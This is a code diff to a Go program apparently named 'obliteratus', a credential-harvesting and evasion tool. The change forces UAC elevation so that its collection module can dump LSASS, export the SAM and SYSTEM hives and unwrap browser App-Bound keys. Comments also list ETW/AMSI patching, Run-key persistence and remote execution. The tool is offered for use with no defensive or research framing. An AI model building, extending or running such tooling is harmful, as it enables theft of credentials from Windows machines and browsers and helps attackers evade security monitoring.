@@ -30,7 +30,7 @@ import (
 )
 
 // version is the release identifier shown in /v1/sys/st and audit reports.
-const version = "2.0.0"
+const version = "2.0.1"
 
 func main() {
 	// Hidden internal mode: the collector re-launches this binary as SYSTEM
@@ -39,6 +39,12 @@ func main() {
 	if len(os.Args) >= 4 && os.Args[1] == "-abe-helper" {
 		os.Exit(audit.ABEHelper(os.Args[2], os.Args[3]))
 	}
+
+	// The UAC-relaunched child is tagged with elevate.MarkerArg so a token that
+	// never elevates cannot loop on UAC prompts. Strip it before flag.Parse,
+	// which would otherwise reject it as an unknown flag.
+	cleanArgs, elevationAttempted := elevate.StripMarker(os.Args)
+	os.Args = cleanArgs
 
 	var (
 		addr        = flag.String("addr", server.DefaultAddr, "listen address (must be loopback)")
@@ -94,7 +100,23 @@ func main() {
 	}
 
 	// --------------------------------------------------------------- elevation
-	if *elevateFlag {
+	// Credential collection cannot work without an elevated token: the SAM and
+	// SYSTEM hive exports need SeBackupPrivilege, the LSASS minidump needs
+	// SeDebugPrivilege and the browser App-Bound key unwrap spawns a SYSTEM
+	// helper. Unlocking it therefore forces elevation up front, instead of
+	// surfacing an opaque failure the first time an operator clicks "dump".
+	// The other modules stay usable unelevated (HKCU Run keys, own-process
+	// ETW/AMSI patching, remote execution), so they are not force-elevated.
+	needsAdmin := *elevateFlag || (*collect && !elevated)
+	if needsAdmin && !elevated {
+		if elevationAttempted {
+			// The UAC relaunch already ran and still produced a filtered token
+			// (prompt declined, or policy strips the admin group). Fail loudly
+			// rather than relaunch again or run a module that cannot work.
+			log.Fatalf("[!] --enable-collect needs an elevated token and the UAC relaunch did not provide one; "+
+				"re-run from an Administrator prompt (obliteratus %s)", version)
+		}
+		log.Println("[*] --enable-collect requires an elevated token: requesting elevation via UAC")
 		elevate.RunElevated() // returns only when already elevated
 	}
 
